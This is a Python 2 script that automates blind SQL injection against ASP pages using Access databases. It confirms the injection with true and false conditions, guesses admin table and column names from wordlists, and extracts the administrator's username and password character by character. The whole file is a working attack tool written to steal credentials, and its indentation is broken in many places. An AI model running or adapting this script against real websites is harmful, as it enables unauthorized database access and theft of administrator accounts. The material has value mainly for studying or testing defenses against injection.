#!/usr/bin/python 
# ASP ACCESS SQL Injection Test 
# Written by ToToDoDo (QQ:8924007) Email: osbbs@osbbs.com 

from sys import exit 
from urllib import urlopen 
from string import join,strip 
from re import search 

def get_tablename(): 
tablefile = open("table.txt") 
for line in tablefile.readlines(): 
line = strip(line) 
sql = join(['%20and%20exists%20(select%20*%20from%20',line,')'],'') 
urlfile = urlopen(url+sql) 
htmlcodes = urlfile.read() 
if not search(judge,htmlcodes): 
  print "Error:",line 
else: 
  print "Found the admin table name:", line,"\n" 
  print "Now! Start to get name column from",line,"table" 
  get_namecolumn(line) 
  print "Now! Start to get password column from",line,"table" 
  get_passwordcolumn(line) 
  break 

def get_namecolumn(tablename): 
namecolumn = open("namecolumn.txt") 
for namecolumnline in namecolumn.readlines(): 
namecolumnline = strip(namecolumnline) 
sql = join(['%20and%20exists%20(select%20',namecolumnline,'%20from%20',tablename,')'],'')
urlfile = urlopen(url+sql) 
htmlcodes = urlfile.read() 
if not search(judge,htmlcodes): 
  print "Error:",namecolumnline 
else: 
  print "Found the  name column from admin table:", namecolumnline,"\n" 
  get_usernamelenth(tablename,namecolumnline) 
  break 

def get_passwordcolumn(tablename): 
passwordcolumn = open("passwordcolumn.txt") 
for passwordcolumnline in passwordcolumn.readlines(): 
passwordcolumnline = strip(passwordcolumnline) 
sql = join(['%20and%20exists%20(select%20',passwordcolumnline,'%20from%20',tablename,')'],'')
urlfile = urlopen(url+sql) 
htmlcodes = urlfile.read() 
if not search(judge,htmlcodes): 
  print "Error:",passwordcolumnline 
else: 
  print "Found the password column from admin table:", passwordcolumnline,"\n" 
  get_passwordlenth(tablename,passwordcolumnline) 
  break 

def get_usernamelenth(tablename,namecolumn): 
for x in range(1,51): 
sql = join(['%20and%201=(select%20top%201%20Count(*)%20From%20',tablename,'%20where%20len(',namecolumn,')=',str(x),')'],'')
urlfile = urlopen(url+sql) 
htmlcodes = urlfile.read() 
if not search(judge,htmlcodes): 
  print "Error:",x 
else: 
  print "Found the lenth of the username:", x,"\n" 
  get_username(tablename,namecolumn,x) 
  break 

def get_passwordlenth(tablename,passwordcolumn): 
for x in range(1,51): 
sql = join(['%20and%201=(select%20top%201%20Count(*)%20From%20',tablename,'%20where%20len(',passwordcolumn,')=',str(x),')'],'')
urlfile = urlopen(url+sql) 
htmlcodes = urlfile.read() 
if not search(judge,htmlcodes): 
  print "Error:",x 
else: 
  print "Found the lenth of the password:", x,"\n" 
  get_password(tablename,passwordcolumn,x) 
  break 

def get_username(tablename,namecolumn,lenth): 
list = [] 
for x in [range(48,58),range(97,123),range(65,91),range(33,48),range(58,65),range(91,97),range(123,256),range(1,33)]:
    list.extend(x) 
global username 
username  = '' 
for y in range(1,lenth+1): 
print "Now! Crack the left ",y," of the username","Waiting~~~~~~~" 
for z in list: 
     sql = join(["%20and%201=(select%20top%201%20count(*)%20from%20",tablename,"%20where%20Asc(mid(",namecolumn,",",str(y),",","1))=",str(z),")"],'')
     urlfile = urlopen(url+sql) 
     htmlcodes = urlfile.read() 
     if search(judge,htmlcodes): 
         username = join([username,chr(z)],'') 
         break 
print "Found the username = :",username,"\n" 

def get_password(tablename,passwordcolumn,lenth): 
list = [] 
for x in [range(48,58),range(97,123),range(65,91),range(33,48),range(58,65),range(91,97),range(123,256),range(1,33)]:
    list.extend(x) 
global password 
password = '' 
for y in range(1,lenth+1): 
print "Now! Crack the left ",y," of the password","Waiting~~~~~~~" 
for z in list: 
     sql = join(["%20and%201=(select%20top%201%20count(*)%20from%20",tablename,"%20where%20Asc(mid(",passwordcolumn,",",str(y),",","1))=",str(z),")"],'')
     urlfile = urlopen(url+sql) 
     htmlcodes = urlfile.read() 
     if search(judge,htmlcodes): 
         password = join([password,chr(z)],'') 
         break 
print "Found the password = :",password,"\n" 

print "\n########################################################################\n"
print " ASP+ACCESS SQL Injection Scripts By ToToDoDo with Python 2.3.x(QQ:8924007)" 
print " Email: osbbs@msn.com\n" 
print "========================================================================";
print """Usage: 
C:\Python23>python asp_inject.py 
Supply a URL to test inject =  http://127.0.0.1/article/list.asp?id=3 

Supply some string in correct page but not in error page to help this script to 
judge properly. 

Judge string = test\n""" 
print "########################################################################\n";
url = raw_input('Supply a URL to test inject =  ') 
if url == '': 
print "U must supply a URL with '.asp?xxx=' in" 
exit(1) 

judge = raw_input("\nSupply some string in correct page but not in error page to help this script to judge properly.\n\nJudge string = ") 
if judge == '': 
print "U must supply a string to help judge!" 
exit(1) 

a = '%20and%201=1' 
b = '%20and%201=2' 

urlfile_a = urlopen(url+a) 
urlfile_b = urlopen(url+b) 

htmlcodes_a = urlfile_a.read() 
htmlcodes_b = urlfile_b.read() 

if search(judge,htmlcodes_a) and not search(judge,htmlcodes_b): 
print "\n\n\nFound injection:",url,"\n\n\nNow,start to get the table name!","\n" 
get_tablename() 
print "\n\n\nThe admin's account name is ",username,"\nThe admin's password is ",password 
else: 
print "Can't be Injected" 